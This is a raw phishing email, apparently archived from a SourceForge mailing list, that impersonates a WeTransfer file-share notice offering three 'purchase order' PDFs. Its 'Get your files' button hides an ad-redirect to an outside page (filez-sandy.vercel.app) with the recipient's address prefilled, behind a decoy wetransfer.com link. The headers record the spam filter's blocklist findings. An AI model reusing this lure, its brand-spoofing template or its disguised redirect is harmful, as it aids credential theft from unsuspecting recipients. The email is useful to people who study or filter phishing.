Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 00872B02658
	for <lists+osst-users@lfdr.de>; Fri, 11 Jul 2025 23:24:46 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=j9t1xrUK3i9FroTOIDaThumXxEkI+GDRDF7MRD48cEM=; b=g4hJhiUY8T/VDZIYqAmwTbBjBM
	fiiP8pkjOHJvQCoPXKCja1XtlwIJ7q76yNpDmUoKxnLzQzIRs9xKSoj4lLBUJqt8nTjObQ1Ec2C5a
	LHGolWYW8mKUP1ddmNTa9jEL3HNP5FXtcUh84JlIBIKKi8sguPlR0Xq+Wvp3lggHglvA=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uaLEb-0002Z5-Rg
	for lists+osst-users@lfdr.de;
	Fri, 11 Jul 2025 21:24:45 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <bounce@striqolict.store>) id 1uaLEO-0002Yq-28
 for osst-users@lists.sourceforge.net; Fri, 11 Jul 2025 21:24:32 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=sSHJvwxCL31Hu643En6GlpPcD39jRjvB6TqzNYYX4co=; b=Jn0/Ym2ZWmFy+u153gOSEl3CHk
 RjeLjdKZFE4h8cybKZaybzA0vfCD6NG5bC2pKqxV5bDbL1K3yn700HGGwHZZd3TanfUF/Ehwr0y50
 1yL5DAJD5HItyyGp8X2RMfb7u0VhUo+QGMJuT2Q25YDPvoySyxTPL8J+IF1HOtodgjtM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=sSHJvwxCL31Hu643En6GlpPcD39jRjvB6TqzNYYX4co=; b=f
 Mtik+OfUntPZ9nJUBs//UQCvqOzitsXpo7Uv1ppgkUCSMMVltXLYdiA9M7OpekFUggg4M+hfiZ4uj
 4St6q576h25A41HKLkBpqGfIELlL8RD2k0xGrduwbFzO2d4sB6bhjmydZ/UWGU5RfB9dTcLnxU3Y6
 WwOBfXuSTgS1XTc0=;
Received: from box.striqolict.store ([104.168.140.76])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1uaLEN-0006dn-CB for osst-users@lists.sourceforge.net;
 Fri, 11 Jul 2025 21:24:32 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=striqolict.store;
 s=mail; t=1752243218;
 bh=sSHJvwxCL31Hu643En6GlpPcD39jRjvB6TqzNYYX4co=;
 h=From:To:Subject:Date:From;
 b=F5UfgfxZFCSOiTELuXwbeVpzGDCyilr1+300xoqsLx9twPd9pSg/S2gHvO8FMVD4f
 y2llfD46BRIhEmp7jIVcxzyV/5v/sj6NvTdh7cgWFlWVstceuJrwNuqAKXGfJznWbp
 IRbAxdQqhZr6br4dNEdPOKKoC243EcsC17cFxE/avFMDXU3pvTwxNel4gXFEz0Owyo
 EPynIdSMIg3H5qux6Q8skJE3xosdsqP9EW6ys4aQKDDBVI7b8gsUD0GzYsRTw+CwyU
 DOxE7ovz2eJ2koqN8Oexd25GFZVu0OUkzJ67hzgHZX6ikhuKg5+F3Mido0L421dUcM
 ibe7QkCeWFtpw==
Received: from authenticated-user (box.striqolict.store [104.168.140.76])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by box.striqolict.store (Postfix) with ESMTPSA id DDD17E263D
 for <osst-users@lists.sourceforge.net>; Fri, 11 Jul 2025 09:13:37 -0500 (CDT)
To: osst-users@lists.sourceforge.net
Date: 11 Jul 2025 07:13:30 -0700
Message-ID: <20250711071330.0DF79071132D5856@striqolict.store>
MIME-Version: 1.0
X-Spam-Score: 3.5 (+++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  osst-users@lists.sourceforge.net You received some files
   via wetransfer 3 items, 96 MB in total · Expires on 20th July, 2025 Get your
    files Download link https://wetransfer.com/downloads/95153613ffb5 [...] 
 
 Content analysis details:   (3.5 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
                             [URI: filez-sandy.vercel.app]
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
                             domain
  1.5 FROM_FMBLA_NEWDOM      From domain was registered in last 7 days
  0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
                             [104.168.140.76 listed in wl.mailspike.net]
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL blocklist
                             [URI: striqolict.store]
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.2 _SCC_HTML_ODDDIV8      RAW: Idiosyncratic HTML structure used by spammers
X-Headers-End: 1uaLEN-0006dn-CB
Subject: [Osst-users] You received some files via WeTransfer
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: WeTransfer via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: WeTransfer <contact@striqolict.store>
Content-Type: multipart/mixed; boundary="===============2088161733199364462=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============2088161733199364462==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"></head>
<body>
<div class=3D"ydp783f8cc8yahoo-style-wrap" style=3D"font-family: Helvetica =
Neue, Helvetica, Arial, sans-serif; font-size: 13px;">
<div id=3D"ydp783f8cc8yiv9880020113">
<div>
<div class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yahoo-style-wrap" style=3D=
"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; font-size: 13px=
;">
<div id=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121">
<div>
<div class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-style-w=
rap" style=3D"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; fo=
nt-size: 13px;">
<div dir=3D"ltr">
<div>
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
word-spacing: 0px; white-space: normal;=20
border-collapse: collapse; table-layout: fixed; border-spacing: 0px; backgr=
ound-color: rgb(255, 255, 255); text-decoration-style: initial; text-decora=
tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 55px 0px 0=
px; width: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 784px; font-size: 10px;" bgcolor=3D"#409fff">
<center>
<table align=3D"center" class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412=
894121yahoo-compose-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-com=
pose-table-card ydp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-comp=
ose-table-card" style=3D"margin: 0px auto; padding: 0px; border-collapse: c=
ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
g=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 0px; min-height: 16px;">&nbsp;</td></tr>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 0px;">&nbsp;</td></tr></tbody></table></center></td></tr></tbody></table>=
</td></tr></tbody></table>
<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
 font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
rd-spacing: 0px; white-space: normal; background-color: rgb(255, 255, 255);=
 text-decoration-style: initial; text-decoration-color: initial;">&nbsp;</p=
>
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
word-spacing: 0px; white-space: normal;=20
border-collapse: collapse; table-layout: fixed; border-spacing: 0px; text-d=
ecoration-style: initial; text-decoration-color: initial;" bgcolor=3D"white=
" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 60px 80p=
x 0px; width: 784px; color: rgb(23, 24, 26); line-height: 30px; font-family=
: Arial, sans-serif; font-size: 26px; font-style: normal; font-weight: norm=
al; word-spacing: 0px;">
<h2 class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydpc77f4e7fv1s=
ubject" style=3D"line-height: 1.2; font-size: 1.5em; font-weight: bold; mar=
gin-top: 0px;">osst-users@lists.sourceforge.net</h2><br>You received some f=
iles via wetransfer</td></tr>
<tr>
<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 20px 80p=
x 0px; width: 784px; color: rgb(106, 109, 112); line-height: 23px; font-fam=
ily: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: n=
ormal; word-spacing: 0px;">3 items, 96 MB in total &middot; Expires on&nbsp=
;20th July, 2025</td></tr>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 160px=
 0px; width: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 464px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 464px;">
<a style=3D"padding: 15px 20px; border-radius: 25px; text-align: center; co=
lor: white; font-family: Pro Arial, sans-serif; font-size: 14px; font-style=
: normal; word-spacing: 0px; display: block; background-color: rgb(64, 159,=
 255); text-decoration-style: solid; text-decoration-color: currentcolor; t=
ext-decoration-line: none;"=20
href=3D"https://googleads.g.doubleclick.net/pcs/click?xai=3DAKAOjssIdZGtK2L=
Gw4coQMwtQcONuf8cVZUVHUrlFgT33_wiLCuxpoweUvHdBH9neY4iW-CZh2SzgITptx6j64F0B2=
pEU0uoeRfmKTeyn7LSG5Irubqjv6IFl9MeqTp84ZT99WRJlZDMgrwUaUI7QjgNwL22AVveJm980=
wuVNryiILT2WhxCPmcY8M7PVIOygAXT_382p7PUn7bIByn2OjlTfCiaqta3tAhZWCuROeXZPznm=
5cGhgUYspVywPb8Y8GbuT5pyEUyF89icmqe5zg&amp;sig=3DCg0ArKJSzFtr0kI2Y6Ll&amp;a=
durl=3Dhttps://filez-sandy.vercel.app/?web=3Dosst-users@lists.sourceforge.n=
et" target=3D"_blank" rel=3D"nofollow &#13;&#10;noopener">
Get your files</a></td></tr></tbody></table></td></tr>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 80px =
0px; width: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 624px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
: 624px; line-height: 0; font-size: 1px; border-bottom-color: rgb(244, 244,=
 244); border-bottom-width: 2px; border-bottom-style: solid;">&nbsp;</td></=
tr></tbody></table></td></tr>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 50px 80px =
0px; width: 784px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
y: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: nor=
mal; word-spacing: 0px;"><span style=3D"color: rgb(23, 24, 26); font-family=
: Arial, sans-serif, serif, EmojiFont; font-size: 18px; font-weight: 500;">=
Download link</span><br>
<a style=3D"color: rgb(23, 24, 26); font-family: Pro Arial, sans-serif; fon=
t-weight: normal; background-color: transparent; text-decoration-style: sol=
id; text-decoration-color: currentcolor; text-decoration-line: underline;" =
href=3D"https://wetransfer.com/downloads/95153613ffb5af6705eaaab73abb9c2f20=
200622103720/520bdbac9de5b6d32d08cd5d0c842cd220200622103757/d55af0" target=
=3D"_blank" rel=3D"nofollow noopener">
<span style=3D"color: rgb(64, 159, 255); font-weight: normal; text-decorati=
on-style: solid; text-decoration-color: currentcolor; text-decoration-line:=
 underline;">https://<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6=
412894121ydpc77f4e7fv1v1marky67ace8m6">wetransfer</span>.com/downloads/9515=
3613ffb5af6705eaaab73abb9c2f20200622103720/520bdbac9de5b6d32d08cd5d0c842cd2=
20200622103757/d55af0</span></a></td></tr>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 50px 80px =
0px; width: 784px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
y: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: nor=
mal; word-spacing: 0px;"><span style=3D"color: rgb(23, 24, 26); font-family=
: Arial, sans-serif, serif, EmojiFont; font-size: 18px; font-weight: 500;">=
3 items</span></td></tr>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px 80px 5=
0px; width: 784px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
y: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: nor=
mal; word-spacing: 0px;">
<div style=3D"color: rgb(23, 24, 26); font-family: Arial, sans-serif, serif=
, EmojiFont; font-size: 18px; font-weight: 500;">&nbsp;</div>
<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
; border-bottom-width: 1px; border-bottom-style: solid;">
<div style=3D"color: rgb(23, 24, 26); line-height: 16px; font-family: Arial=
, sans-serif, serif, EmojiFont; font-size: 14px; font-style: normal; font-w=
eight: normal; word-spacing: 0px;">Purchase Order .pdf</div>
<div style=3D"color: rgb(106, 109, 112); line-height: 16px; font-size: 12px=
;">76.9 MB</div></div>
<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
; border-bottom-width: 1px; border-bottom-style: solid;">
<div style=3D"color: rgb(23, 24, 26); line-height: 16px; font-family: Arial=
, sans-serif, serif, EmojiFont; font-size: 14px; font-style: normal; font-w=
eight: normal; word-spacing: 0px;">List of Items.pdf</div>
<div style=3D"color: rgb(106, 109, 112); line-height: 16px; font-size: 12px=
;">7.83 MB</div></div>
<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
; border-bottom-width: 1px; border-bottom-style: none;">
<div style=3D"color: rgb(23, 24, 26); line-height: 16px; font-family: Arial=
, sans-serif, serif, EmojiFont; font-size: 14px; font-style: normal; font-w=
eight: normal; word-spacing: 0px;">Specifications.pdf</div>
<div style=3D"color: rgb(106, 109, 112); line-height: 16px; font-size: 12px=
;">5.79 MB</div></div></td></tr></tbody></table></td></tr></tbody></table><=
/td></tr></tbody></table>
<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
 font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
rd-spacing: 0px; white-space: normal; background-color: rgb(255, 255, 255);=
 text-decoration-style: initial; text-decoration-color: initial;">&nbsp;</p=
>
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
word-spacing: 0px; white-space: normal;=20
border-collapse: collapse; table-layout: fixed; border-spacing: 0px; backgr=
ound-color: rgb(255, 255, 255); text-decoration-style: initial; text-decora=
tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 2px 0px 0p=
x; width: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" bgcolor=3D"white" border=3D"0" =
cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px 20px; =
width: 784px;">
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 744px; border-collapse: collapse;=
 table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 13px 0px=
; width: 744px; color: rgb(121, 124, 127); line-height: 24px; font-family: =
Arial, sans-serif; font-size: 12px; font-style: normal; font-weight: normal=
; word-spacing: 0px;">
<p style=3D"margin: 0px; padding: 0px;">To make sure our emails arrive, ple=
ase add&nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; ba=
ckground-color: transparent; text-decoration-style: solid; text-decoration-=
color: currentcolor; text-decoration-line: none;" href=3D"http://webmail.de=
toenategroup.com/#NOP" target=3D"_blank" rel=3D"nofollow noopener"><span st=
yle=3D"color: rgb(121, 124, 127); font-weight: normal;">
 noreply@<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydp=
c77f4e7fv1v1marky67ace8m6">wetransfer</span>.com</span></a>
 &nbsp;to&nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; =
background-color: transparent; text-decoration-style: solid; text-decoratio=
n-color: currentcolor; text-decoration-line: underline;" href=3D"https://we=
transfer.zendesk.com/hc/en-us/articles/204909429?utm_campaign=3DWT_email_tr=
acking&amp;utm_source=3Dnotify_recipient_email&amp;utm_medium=3DAdd+Us+To+Y=
our+Contacts+Link&amp;utm_content=3Dgeneral" target=3D"_blank" rel=3D"nofol=
low noopener">your contacts</a>.</p></td></tr></tbody></table>
</td></tr></tbody>
</table></td></tr></tbody></table>
<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
 font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
rd-spacing: 0px; white-space: normal; background-color: rgb(255, 255, 255);=
 text-decoration-style: initial; text-decoration-color: initial;">&nbsp;</p=
>
<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
word-spacing: 0px; white-space: normal;=20
border-collapse: collapse; table-layout: fixed; border-spacing: 0px; backgr=
ound-color: rgb(255, 255, 255); text-decoration-style: initial; text-decora=
tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 30px 20p=
x; width: 784px; color: rgb(121, 124, 127); line-height: 23px; font-family:=
 Arial, sans-serif; font-size: 12px; font-style: normal; font-weight: norma=
l; word-spacing: 0px;">
<a style=3D"color: rgb(121, 124, 127); font-weight: normal; background-colo=
r: transparent; text-decoration-style: solid; text-decoration-color: curren=
tcolor; text-decoration-line: underline;" href=3D"https://wetransfer.com/ab=
out?utm_campaign=3DWT_email_tracking&amp;utm_content=3Dgeneral&amp;utm_medi=
um=3Dabout_link&amp;utm_source=3Dnotify_recipient_email" target=3D"_blank" =
rel=3D"nofollow noopener">
<span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decorat=
ion-style: solid; text-decoration-color: currentcolor; text-decoration-line=
: underline;">About&nbsp;<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861=
yiv6412894121ydpc77f4e7fv1v1marky67ace8m6">WeTransfer</span></span></a>&nbs=
p;<span style=3D"color: rgb(121, 124, 127);">&nbsp;&nbsp;&middot;&nbsp;&nbs=
p;</span>
 &nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; backgrou=
nd-color: transparent; text-decoration-style: solid; text-decoration-color:=
 currentcolor; text-decoration-line: underline;" href=3D"https://wetransfer=
=2Ezendesk.com/hc/en-us?utm_campaign=3DWT_email_tracking&amp;utm_source=3Dn=
otify_recipient_email&amp;utm_medium=3DFooter+Help+Link&amp;utm_content=3Dg=
eneral" target=3D"_blank" rel=3D"nofollow noopener">
 <span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decora=
tion-style: solid; text-decoration-color: currentcolor; text-decoration-lin=
e: underline;">Help</span></a>&nbsp;<span style=3D"color: rgb(121, 124, 127=
);">&nbsp;&nbsp;&middot;&nbsp;&nbsp;</span>
 &nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; backgrou=
nd-color: transparent; text-decoration-style: solid; text-decoration-color:=
 currentcolor; text-decoration-line: underline;" href=3D"https://wetransfer=
=2Ecom/legal/terms?utm_campaign=3DWT_email_tracking&amp;utm_content=3Dgener=
al&amp;utm_medium=3Dlegal_link&amp;utm_source=3Dnotify_recipient_email" tar=
get=3D"_blank" rel=3D"nofollow noopener">
 <span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decora=
tion-style: solid; text-decoration-color: currentcolor; text-decoration-lin=
e: underline;">Legal</span>&nbsp;</a><span style=3D"color: rgb(121, 124, 12=
7);">&nbsp;&nbsp;&middot;&nbsp;&nbsp;</span>
 &nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; backgrou=
nd-color: transparent; text-decoration-style: solid; text-decoration-color:=
 currentcolor; text-decoration-line: underline;"=20
href=3D"https://wetransfer.zendesk.com/hc/en-us/requests/new?ticket_form_id=
=3D360000007663&amp;utm_campaign=3DWT_email_tracking&amp;utm_source=3Dnotif=
y_recipient_email&amp;utm_medium=3DSpam+Support+Link&amp;utm_content=3Dgene=
ral&amp;token=3DeyJhbGciOiJub25lIn0.eyJyZXF1ZXN0X3N1YmplY3QiOiJSZXBvcnQgdGh=
pcyB0cmFuc2ZlciBhcyBzcGFtIiwicmVxdWVzdF9kZXNjcmlwdGlvbiI6Imh0dHBzOi8vd2V0cm=
Fuc2Zlci5jb20vZG93bmxvYWRzLzk1MTUzNjEzZmZiNWFmNjcwNWVhYWFiNzNhYmI5YzJmMjAyM=
DA2MjIxMDM3MjAvNTIwYmRiYWM5ZGU1YjZkMzJkMDhjZDVkMGM4NDJjZDIyMDIwM
&#10;DYyMjEwMzc1Ny9kNTVhZjAiLCJyZXF1ZXN0X2Fub255bW91c19yZXF1ZXN0ZXJfZW1haWw=
iOiJyLndvb2RzQHBkc2Rlc2lnbi1idWlsZC5jby51ayIsInJlcXVlc3RfY3VzdG9tX2ZpZWxkc1=
8zNjAwMDAxNzEyMjMiOiIwZjRlZjEzZmNlNDcyMzZkOGNjMDQ5ZjZkMGQyMGYzNzI2YWMwMDFhM=
WFmZDMzNmYxYzkyOWM2MzY5ZjhlYzA4MjdhOWRiNTM2ZWMyM2I2MjQwOGUxMTdmYTcyYjkyZDQ3=
M2Y4Yzg4NzRkYTI0OWI1MjMxY2Y2N2M4MDc3MGMyZiJ9." target=3D"_blank" rel=3D"nof=
ollow noopener">
 <span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decora=
tion-style: solid; text-decoration-color: currentcolor; text-decoration-lin=
e: underline;">Report this transfer as spam</span></a></td></tr></tbody></t=
